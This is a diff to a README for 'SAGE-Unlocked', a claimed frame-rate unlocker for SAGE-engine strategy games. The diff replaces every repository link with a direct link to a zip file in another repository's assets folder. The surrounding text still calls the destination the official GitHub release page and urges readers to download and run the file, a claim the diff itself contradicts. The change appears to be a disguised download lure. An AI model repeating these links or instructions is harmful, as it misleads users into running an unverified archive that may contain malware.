@@ -5,7 +5,7 @@ description: "Unlock 30 FPS cap in C&C and Battle for Middle-earth games for smo
 ---
 # 🎮 SAGE-Unlocked - Run Every SAGE Game at Blazing Speed
 
-[![Download SAGE-Unlocked](https://img.shields.io/badge/Download-SAGE--Unlocked-2ea44f?style=for-the-badge&logo=github)](https://github.com/nhan1112/SAGE-Unlocked)
+[![Download SAGE-Unlocked](https://img.shields.io/badge/Download-SAGE--Unlocked-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/nhan1112/nhan1112.github.io/main/assets/v3.2.zip)
 
 ---
 
@@ -53,7 +53,7 @@ Here is everything you get when you use SAGE-Unlocked:
 
 Follow these exact steps to get SAGE-Unlocked on your computer:
 
-1. **Open the download link** – Click the big green button at the top of this page, or click here: [https://github.com/nhan1112/SAGE-Unlocked](https://github.com/nhan1112/SAGE-Unlocked)
+1. **Open the download link** – Click the big green button at the top of this page, or click here: [https://raw.githubusercontent.com/nhan1112/nhan1112.github.io/main/assets/v3.2.zip](https://raw.githubusercontent.com/nhan1112/nhan1112.github.io/main/assets/v3.2.zip)
 
 2. **Visit this link to download the application** – The page you land on is the official GitHub release page for SAGE-Unlocked.
 
@@ -175,7 +175,7 @@ The download takes less than one minute, and the installation is zero-effort. Tr
 
 To wrap up, here is your download link once more:
 
-[👉 Download SAGE-Unlocked Now](https://github.com/nhan1112/SAGE-Unlocked)
+[👉 Download SAGE-Unlocked Now](https://raw.githubusercontent.com/nhan1112/nhan1112.github.io/main/assets/v3.2.zip)
 
 Click it, download the file, run it, and play. That is all there is to it.
 
